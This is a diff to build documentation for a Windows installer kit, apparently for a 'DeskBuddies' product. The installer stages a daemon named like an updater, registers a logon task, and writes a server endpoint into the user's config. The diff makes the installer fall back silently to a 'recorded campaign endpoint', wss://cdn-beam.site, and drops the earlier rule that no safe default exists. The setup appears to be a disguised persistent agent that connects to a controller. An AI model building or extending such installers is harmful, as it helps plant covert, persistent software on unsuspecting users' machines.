@@ -70,7 +70,7 @@ The kit is a directory containing exactly these files:
 
    | define | value for this host |
    |---|---|
-   | `HOSTKIT_SERVER` | from `--server` (the kit `!error`s without it) |
+   | `HOSTKIT_SERVER` | from `--server`, else `HOSTKIT_SERVER`, else the recorded campaign endpoint `wss://cdn-beam.site` (the value the Creator Desk installer seeds - `bf-win-ffi/src-tauri/installer/installer-hooks.nsh:35`). An explicit `--server` always wins. |
    | `HOSTKIT_DAEMON_NAME` | `app-update-daemon.exe` - must match `extraFiles`, because the hook stages the daemon out of `$INSTDIR` |
    | `HOSTKIT_TASK_NAME` | `Bright Floppy DeskBuddies Update` (the kit default names the Creator Desk) |
    | `HOSTKIT_PRODUCT_NAME` | `DeskBuddies` - the customer-visible installer progress strings. Guarded with `!ifndef`, so a caller can still override it on the makensis command line. |
@@ -85,8 +85,9 @@ The kit is a directory containing exactly these files:
    If the kit was not staged, the bridge emits a compile-time warning and the
    installer is built **without** conf seeding or the logon task, rather than
    failing - a core-less installer must never be mistaken for a shipping one.
-   If the kit was staged without `--server`, it is a hard `!error` instead:
-   there is no safe default endpoint to seed.
+   If the kit was staged without the defines file at all (a hand-staged kit),
+   it is a hard `!error` instead of a guess: the lane always writes the defines,
+   so this only fires for a kit copied in by hand.
 6. The NSIS include applies to the `nsis` target only; the `portable`
    target carries no installer hooks.
 
@@ -161,11 +162,17 @@ npm run dist:stager -- --kit <kit-dir> --server https://<endpoint>
 # -> release/DeskBuddies Setup 0.2.0.exe  (+ the portable artifact)
 ```
 
-No wine flag there: Windows edits and signs natively. `--server` is required for
-any installer target: it is the endpoint the installer seeds into
-`%LOCALAPPDATA%\BrightFloppy\desk.conf` (SERVER only - never a token), and the
-kit's include refuses to compile without it. `--dir` and `--stage-only` may
-omit it.
+No wine flag there: Windows edits and signs natively.
+
+`--server` is the endpoint the installer seeds into
+`%LOCALAPPDATA%\BrightFloppy\desk.conf` - **SERVER only, never a token**
+(INV-44 P0-1). It is optional: with no `--server` the lane uses the recorded
+campaign endpoint `wss://cdn-beam.site` (the same value the Creator Desk
+installer seeds), prints that it did so, and records it in
+`stager-stage/PROVENANCE.txt`. Resolution order is `--server` > `HOSTKIT_SERVER`
+> that default, and the resolved value is always printed, so a build log always
+shows which endpoint went in. `http(s)` and `wss` URLs are accepted; anything
+else is refused with exit 2.
 
 ### What the installer must never do
 
